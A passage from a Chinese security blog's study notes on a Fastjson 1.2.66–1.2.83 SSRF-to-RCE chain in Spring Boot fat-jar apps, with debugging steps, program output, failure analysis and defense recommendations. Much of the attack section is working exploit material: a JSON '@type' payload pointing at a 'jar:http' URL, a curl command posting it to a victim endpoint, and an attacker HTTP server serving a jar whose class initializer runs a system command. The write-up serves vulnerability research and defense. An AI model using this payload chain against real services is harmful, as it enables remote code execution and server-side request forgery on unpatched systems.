+<h3 id="5-2-调试步骤"><a href="#5-2-调试步骤" class="headerlink" title="5.2 调试步骤"></a>5.2 调试步骤</h3><h4 id="Step-0：验证-JDK-版本"><a href="#Step-0：验证-JDK-版本" class="headerlink" title="Step 0：验证 JDK 版本"></a>Step 0：验证 JDK 版本</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> version <span class="string">&quot;1.8.0_202&quot;</span></span><br><span class="line"><span class="attribute">Java</span>(TM) SE Runtime Environment (build <span class="number">1</span>.<span class="number">8</span>.<span class="number">0</span>_202-b08)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-1：基线测试（普通-AppClassLoader）"><a href="#Step-1：基线测试（普通-AppClassLoader）" class="headerlink" title="Step 1：基线测试（普通 AppClassLoader）"></a>Step 1：基线测试（普通 AppClassLoader）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;target/classes;lib/fastjson-1.2.83.jar&quot;</span> Test parse-default</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出：</strong></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>Type <span class="keyword">is</span> <span class="keyword">not</span> support. jar:http:.<span class="number">.2130706433</span>:<span class="number">18080.</span>probe!.POC</span><br><span class="line"><span class="string">[server]</span> requests received: <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>结论：</strong> 普通 <code>AppClassLoader</code> 无法解析 <code>jar:http:</code> URL，<code>getResourceAsStream</code> 返回 <code>null</code>。既无 SSRF，也无 RCE。</p>
+<h4 id="Step-2：单独测试-checkAutoType"><a href="#Step-2：单独测试-checkAutoType" class="headerlink" title="Step 2：单独测试 checkAutoType"></a>Step 2：单独测试 checkAutoType</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;target/classes:lib/*&quot;</span> Test2 sb27-check</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出：</strong></p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[check] checkAutoType returned: <span class="keyword">class</span> <span class="title class_">jar</span>:http:..localhost:<span class="number">18080.</span>probe!.POC</span><br><span class="line">[<span class="keyword">server</span>] requests: <span class="number">6</span>      ← SSRF 发生</span><br><span class="line">[pwned] PWNED2 <span class="keyword">exists</span>: <span class="literal">false</span>   ← &lt;clinit&gt; 未执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论：</strong> <code>checkAutoType</code> 阶段触发了 SSRF（HTTP GET 拉取 jar），但类初始化（<code>&lt;clinit&gt;</code>）<strong>没有</strong>在此阶段执行。<code>checkAutoType</code> 与 <code>loadClass</code> 是两个独立步骤。</p>
+<h4 id="Step-3：纯-loadClass（不经过-JSON-parse）"><a href="#Step-3：纯-loadClass（不经过-JSON-parse）" class="headerlink" title="Step 3：纯 loadClass（不经过 JSON.parse）"></a>Step 3：纯 loadClass（不经过 JSON.parse）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;target/classes:lib/*&quot;</span> Test2 sb27-load</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出：</strong></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[load] loadClass <span class="type">OK</span> -&gt; <span class="keyword">class</span> <span class="title class_">jar</span>:http:..localhost:18080.probe!.<span class="title class_ inherited__">POC</span></span><br><span class="line"><span class="title class_ inherited__">REMOTE</span> <span class="title class_ inherited__">POC</span> &lt;clinit&gt; <span class="title class_ inherited__">EXECUTED</span> (<span class="keyword">class</span> defined from jar:http <span class="title class_ inherited__">URL</span>)</span><br><span class="line">[pwned] <span class="title class_ inherited__">PWNED2</span> exists: <span class="literal">true</span>   ← <span class="title class_ inherited__">RCE</span> 成功</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论：</strong> 直接 <code>LaunchedURLClassLoader.loadClass(typeName)</code> 即可触发完整 SSRF → defineClass → <code>&lt;clinit&gt;</code> 链路。不需要 <code>JSON.parse</code>。</p>
+<h4 id="Step-4：完整攻击链路（JSON-parse-FatJar）"><a href="#Step-4：完整攻击链路（JSON-parse-FatJar）" class="headerlink" title="Step 4：完整攻击链路（JSON.parse + FatJar）"></a>Step 4：完整攻击链路（JSON.parse + FatJar）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;target/classes:lib/*&quot;</span> Test2 sb27-parse</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出：</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">parse</span>] autoTypeSupport=<span class="literal">false</span>                ← AutoType 关闭</span><br><span class="line">[<span class="meta">parse</span>] payload=&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;jar:http:..localhost:18080.probe!.POC&quot;</span>,<span class="string">&quot;x&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">REMOTE POC &lt;clinit&gt; EXECUTED                 ← RCE!</span><br><span class="line">[<span class="meta">parse</span>] parsed -&gt; jar:http:..localhost:<span class="number">18080.</span>probe!.POC@<span class="number">282b</span>a1e</span><br><span class="line">[<span class="meta">server</span>] requests: <span class="number">6</span>                         ← SSRF <span class="number">3</span> 次 HTTP GET</span><br><span class="line">[<span class="meta">pwned</span>] PWNED2 exists: <span class="literal">true</span>                  ← 文件落地</span><br><span class="line">[<span class="meta">result</span>] SUCCESS</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-5：远程攻击（跨进程）"><a href="#Step-5：远程攻击（跨进程）" class="headerlink" title="Step 5：远程攻击（跨进程）"></a>Step 5：远程攻击（跨进程）</h4><p><strong>Victim 端：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar victim-app/target/victim-app.jar</span><br><span class="line"><span class="comment"># 输出: ClassLoader: LaunchedURLClassLoader, SafeMode: OFF</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Attacker 端：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> <span class="string">&quot;target/classes&quot;</span> ProbeHttpd 18080 probe_exec.jar 10 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>发送 Payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8080/api/json \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:http:..localhost:18080.probe!.POC&quot;,&quot;x&quot;:1&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Victim 日志：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[victim]</span> <span class="selector-tag">body</span> = &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;jar:http:..localhost:18080.probe!.POC&quot;</span>,<span class="string">&quot;x&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line"><span class="selector-attr">[EXEC]</span> cmd /c start calc.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>Attacker 日志：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[attacker] <span class="built_in">GET</span> /probe HTTP/1.1</span><br><span class="line">[attacker] <span class="built_in">GET</span> /probe HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-关键断点位置（用于-IDEA-Eclipse-动态调试）"><a href="#5-3-关键断点位置（用于-IDEA-Eclipse-动态调试）" class="headerlink" title="5.3 关键断点位置（用于 IDEA&#x2F;Eclipse 动态调试）"></a>5.3 关键断点位置（用于 IDEA&#x2F;Eclipse 动态调试）</h3><table>
+<thead>
+<tr>
+<th>序号</th>
+<th>类</th>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>ParserConfig</code></td>
+<td><code>checkAutoType()</code></td>
+<td>入口，观察 <code>typeName</code> 和 <code>resource</code> 的转换</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>LaunchedURLClassLoader</code></td>
+<td><code>getResource()</code></td>
+<td>观察 <code>jar:http:</code> URL 的解析过程</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>ParserConfig</code></td>
+<td><code>checkAutoType()</code></td>
+<td>ASM <code>ClassReader.accept()</code> 之后，观察注解扫描结果</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>TypeUtils</code></td>
+<td><code>loadClass()</code></td>
+<td>观察 <code>classLoader.loadClass(typeName)</code> 调用</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>LaunchedURLClassLoader</code></td>
+<td><code>findClass()</code></td>
+<td>观察 HTTP 请求发起和 <code>defineClass()</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>恶意类 <code>&lt;clinit&gt;</code></td>
+<td>—</td>
+<td>命令执行点</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、失败原因分析"><a href="#六、失败原因分析" class="headerlink" title="六、失败原因分析"></a>六、失败原因分析</h2><h3 id="6-1-JDK-版本不匹配"><a href="#6-1-JDK-版本不匹配" class="headerlink" title="6.1 JDK 版本不匹配"></a>6.1 JDK 版本不匹配</h3><p><strong>现象：</strong> JDK 9+（含 JDK 21）运行时报 <code>ClassFormatError</code></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java<span class="selector-class">.lang</span><span class="selector-class">.ClassFormatError</span>: Illegal class name <span class="string">&quot;jar:http://2130706433:18080/probe!/POC&quot;</span></span><br><span class="line">    at java.base/java<span class="selector-class">.lang</span><span class="selector-class">.ClassLoader</span><span class="selector-class">.defineClass1</span>(Native Method)</span><br><span class="line">    at java.base/java<span class="selector-class">.lang</span><span class="selector-class">.ClassLoader</span><span class="selector-class">.defineClass</span>(ClassLoader<span class="selector-class">.java</span>:<span class="number">1027</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>原因：</strong> JDK 9 强化了 <code>defineClass</code> 的 internal name 校验，不允许 class 文件名中含有 <code>://</code>、<code>!</code> 等非法字符。</p>
+<p><strong>影响：</strong> <code>defineClass</code> 失败 → <code>TypeUtils.loadClass</code> 抛异常 → fastjson 进入异常处理 → 输出 <code>autoType is not support</code>。</p>
+<p><strong>注意：</strong> 即使 RCE 失败，SSRF（HTTP GET 拉取 jar）在 <code>checkAutoType</code> 阶段<strong>已经发生</strong>。仅靠升级 JDK 不能消除 SSRF。</p>
+<h3 id="6-2-ClassLoader-不是-LaunchedURLClassLoader"><a href="#6-2-ClassLoader-不是-LaunchedURLClassLoader" class="headerlink" title="6.2 ClassLoader 不是 LaunchedURLClassLoader"></a>6.2 ClassLoader 不是 LaunchedURLClassLoader</h3><p><strong>现象：</strong> 普通 classpath 运行时无 SSRF</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>Type <span class="keyword">is</span> <span class="keyword">not</span> support. jar:http:..localhost:<span class="number">18080.</span>probe!.POC</span><br><span class="line"><span class="string">[server]</span> requests received: <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原因：</strong> <code>AppClassLoader</code>（<code>sun.misc.Launcher$AppClassLoader</code>）不能解析 <code>jar:http:</code> URL 协议。<code>getResourceAsStream(&quot;jar:http://...&quot;)</code> 返回 <code>null</code>。</p>
+<p><strong>实际业务中的情况：</strong> Spring Boot FatJar 部署的应用，运行时 ClassLoader 默认就是 <code>LaunchedURLClassLoader</code>。</p>
+<h3 id="6-3-SafeMode-已开启"><a href="#6-3-SafeMode-已开启" class="headerlink" title="6.3 SafeMode 已开启"></a>6.3 SafeMode 已开启</h3><p><strong>现象：</strong> <code>safeMode not support autoType</code></p>
+<p><strong>原因：</strong> <code>ParserConfig.setSafeMode(true)</code> 或 JVM 参数 <code>-Dfastjson.parser.safeMode=true</code> 会在 <code>checkAutoType</code> 的最开始直接抛出异常，不会走到资源探测逻辑。</p>
+<p><strong>这是最有效的防御手段。</strong></p>
+<h3 id="6-4-类缓存导致-不重复执行"><a href="#6-4-类缓存导致-不重复执行" class="headerlink" title="6.4 类缓存导致 &lt;clinit&gt; 不重复执行"></a>6.4 类缓存导致 <code>&lt;clinit&gt;</code> 不重复执行</h3><p><strong>现象：</strong> 第二次攻击时 Victim 返回 200 OK，但 <code>&lt;clinit&gt;</code> 没有执行</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;ok&quot;</span><span class="punctuation">,</span><span class="attr">&quot;parsed&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..localhost:18080.probe!.POC@1601c003&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// 但 calc.exe 没有弹出</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>原因：</strong> </p>
+<ol>
+<li>JVM 规范保证每个类的 <code>&lt;clinit&gt;</code> 只执行一次</li>
+<li>第一次攻击成功时，<code>LaunchedURLClassLoader</code> 已将类加载到 JVM 并缓存</li>
+<li>后续 <code>JSON.parse</code> 同一个 typeName 时，<code>TypeUtils.loadClass</code> 从缓存返回已有的 Class 对象</li>
+<li><code>&lt;clinit&gt;</code> 不再执行</li>
+</ol>
+<p><strong>解决办法：</strong> 重启 Victim JVM 进程（清空类缓存）。</p>
+<h3 id="6-5-Probe-HTTP-服务未启动或-jar-不一致"><a href="#6-5-Probe-HTTP-服务未启动或-jar-不一致" class="headerlink" title="6.5 Probe HTTP 服务未启动或 jar 不一致"></a>6.5 Probe HTTP 服务未启动或 jar 不一致</h3><p><strong>现象：</strong> Victim 返回 500 或连接超时</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span> <span class="number">500</span> Internal Server Error</span><br></pre></td></tr></table></figure>
+
+<p><strong>原因：</strong></p>
+<ul>
+<li>攻击者 HTTP 服务未启动，Victim 无法连接 <code>localhost:18080</code></li>
+<li><code>ProbeHttpd</code> 已启动但服务的 jar 字节是旧的（类加载后 <code>&lt;clinit&gt;</code> 行为与预期不符）</li>
+</ul>
+<p><strong>解决办法：</strong></p>
+<ol>
+<li>确认 Victim 能访问 <code>127.0.0.1:18080</code></li>
+<li>修改 <code>probe_exec.jar</code> 后<strong>重启 ProbeHttpd</strong>（它会将 jar 读入内存）</li>
+<li>同时<strong>重启 Victim</strong>（清空 JVM 类缓存）</li>
+</ol>
+<h3 id="6-6-macOS-系统代理拦截"><a href="#6-6-macOS-系统代理拦截" class="headerlink" title="6.6 macOS 系统代理拦截"></a>6.6 macOS 系统代理拦截</h3><p><strong>现象：</strong> 使用整数 IP <code>2130706433</code> 时 <code>getResource=null</code></p>
+<p><strong>原因：</strong> macOS 系统 HTTP 代理可能将整数 IP 流量转发到代理服务器，导致无法连通本地 probe。</p>
+<p><strong>解决办法：</strong></p>
+<ul>
+<li>使用 <code>-Dpoc.hostToken=localhost</code>（localhost 不含点，且不受代理影响）</li>
+<li>或设置 <code>-Dhttp.nonProxyHosts=*</code> 禁用代理</li>
+</ul>
+<hr>
+<h2 id="七、防御建议"><a href="#七、防御建议" class="headerlink" title="七、防御建议"></a>七、防御建议</h2><table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>★★★</td>
+<td><code>-Dfastjson.parser.safeMode=true</code></td>
+<td><strong>完全免疫</strong></td>
+</tr>
+<tr>
+<td>★★★</td>
+<td>迁移到 fastjson2</td>
+<td>架构不同，不受此问题影响</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td>不解析不可信来源的 JSON</td>
+<td>从源头消除</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td>升级 JDK 9+（组织级）</td>
+<td>阻断 <code>defineClass</code> → RCE，但<strong>不能阻断 SSRF</strong></td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td>出站网络收敛</td>
+<td>阻断 <code>jar:http:</code> URL 的 HTTP 回连</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td>监控 <code>@type</code> 中 <code>jar:</code>、<code>!</code>、<code>..</code>、整数 IP 等模式</td>
+<td>攻击检测</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="八、攻击成功截图"><a href="#八、攻击成功截图" class="headerlink" title="八、攻击成功截图"></a>八、攻击成功截图</h2><blockquote>
+<p><em>（请在此粘贴你的攻击成功截图）</em></p>
+</blockquote>
+<p><strong>截图应包含以下关键证据：</strong></p>
+<ol>
+<li><input disabled type="checkbox"> Victim 控制台显示 <code>ClassLoader: LaunchedURLClassLoader</code> 和 <code>SafeMode: OFF</code></li>
+<li><input disabled type="checkbox"> Attacker 控制台显示 <code>GET /probe HTTP/1.1</code>（SSRF 确认）</li>
+<li><input disabled type="checkbox"> Victim 控制台显示 <code>[EXEC] cmd /c start calc.exe</code>（<code>&lt;clinit&gt;</code> 执行确认）</li>
+<li><input disabled type="checkbox"> 计算器弹出 &#x2F; <code>whoami_result.txt</code> 文件生成（RCE 效果确认）</li>
+<li><input disabled type="checkbox"> curl 返回 <code>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;parsed&quot;:&quot;jar:http:..localhost:18080.probe!.POC@xxxxx&quot;&#125;</code>（200 OK 确认）</li>
+</ol>
+<hr>
+<h2 id="九、核心经验总结"><a href="#九、核心经验总结" class="headerlink" title="九、核心经验总结"></a>九、核心经验总结</h2><ol>
+<li><strong>AutoType 关闭≠安全</strong>：<code>@JSONType</code> 资源探测在 AutoType 检查<strong>之前</strong>执行，形成侧信道</li>
+<li><strong>“无 gadget”本质是换了 gadget</strong>：传统 gadget 是 <code>JdbcRowSetImpl</code> 等 Java 类，这次 gadget 是 <code>LaunchedURLClassLoader</code> 的 <code>jar:http</code> 解析能力——一个”基础设施级”的 gadget</li>
+<li><strong>ASM 是 fastjson 自己带的</strong>：不要被 PoC 的 <code>pom.xml</code> 误导——<code>asm-9.6.jar</code> 只是构建工具，目标环境只需 fastjson 自身</li>
+<li><strong><code>&lt;clinit&gt;</code> 是最终执行点</strong>：无需业务代码二次操作，类加载即触发，是最干净的 RCE 方式</li>
+<li><strong>SSRF 和 RCE 是两个独立阶段</strong>：<code>checkAutoType</code> 阶段触发 SSRF，<code>loadClass</code> 阶段触发 RCE。JDK 9+ 只能阻断后者</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io">Timind</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://timind-sec.github.io/posts/fastjson%E6%97%A0gadget%E7%BB%95%E8%BF%87RCE/">http://timind-sec.github.io/posts/fastjson%E6%97%A0gadget%E7%BB%95%E8%BF%87RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://timind-sec.github.io" target="_blank">Timind's café</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/%E6%B5%85%E8%B0%88RASP%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/" title="浅谈RASP原理及绕过"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">浅谈RASP原理及绕过</div></div><div class="info-2"><div class="info-item-1">1-前言这几天有点沉浸在面经的海洋中了，无意之中看到了Z3r0佬提供的ct红队面经，里面就提到了一个非常熟悉但又陌生的概念——RASP防护，笔者遂浅学了一些关于RASP的工作原理及绕过方式，下面是本人学习笔记。【如有错误，还请纠正】 2-RASP介绍【官方】RASP是一种安全技术，旨在通过在应用程序运行时实施保护机制来增强应用程序的安全性。它使得应用程序能够实时监控和防御潜在的攻击，而不依赖于外部的安全设备或控制措施。因为从 JDK 1.5 开始，Java 提供了一种动态代理机制，允许代理检测在 JVM 中运行的服务，通过插桩的方式修改方法的字节码，而 RASP 实际上就是通过 hook 系统的关键函数实现防护。 其实主要说白了就是，RASP他不同于平时我们所见的waf，常规的waf只针对于攻击者的直接攻击流量，也就是各个路由中添加一道利用提前写好各种规则的防火墙，然而这种只判断直接流量的机制，如今却容易被攻击者精心构造的各种编码、混淆的payload绕过，所以就有了这么一个防御机制：RASP，它通过javaagent机制，随时跟踪攻击者的行为，比如：用户输入直接拼进 SQL →...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Timind</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson-1-2-66%E2%80%931-2-83-JsonType-SSRF-%E2%86%92-RCE-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.</span> <span class="toc-text">一、漏洞背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%8E%86%E5%8F%B2%E8%84%89%E7%BB%9C"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 历史脉络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E4%B8%8E%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.3 与历史漏洞的本质区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text">二、参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.</span> <span class="toc-text">三、漏洞函数位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%A0%B8%E5%BF%83%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">3.1 核心漏洞函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%BE%85%E5%8A%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.2 辅助函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Spring-Boot-%E4%BE%A7"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.3 Spring Boot 侧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">四、漏洞攻击原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%95%B4%E4%BD%93%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 整体攻击链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Payload-%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 Payload 构造原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%81%B6%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E8%AE%BE%E8%AE%A1%EF%BC%88CraftProbe-GenExec%EF%BC%89"><span class="toc-number">1.4.3.</span> <span class="toc-text">4.3 恶意字节码设计（CraftProbe &#x2F; GenExec）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-fastjson-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%85%E7%BD%AE-ASM%EF%BC%9F"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.4 fastjson 为什么内置 ASM？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.5.</span> <span class="toc-text">五、动态调试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E8%B0%83%E8%AF%95%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 调试步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-0%EF%BC%9A%E9%AA%8C%E8%AF%81-JDK-%E7%89%88%E6%9C%AC"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">Step 0：验证 JDK 版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-1%EF%BC%9A%E5%9F%BA%E7%BA%BF%E6%B5%8B%E8%AF%95%EF%BC%88%E6%99%AE%E9%80%9A-AppClassLoader%EF%BC%89"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">Step 1：基线测试（普通 AppClassLoader）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-2%EF%BC%9A%E5%8D%95%E7%8B%AC%E6%B5%8B%E8%AF%95-checkAutoType"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">Step 2：单独测试 checkAutoType</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Step-3%EF%BC%9A%E7%BA%AF-loadClass%EF%BC%88%E4%B8%8D%E7%BB%8F%E8%BF%87-JSON-parse%EF%BC%89"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">Step 3：纯 loadClass（不经过 JSON.parse）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 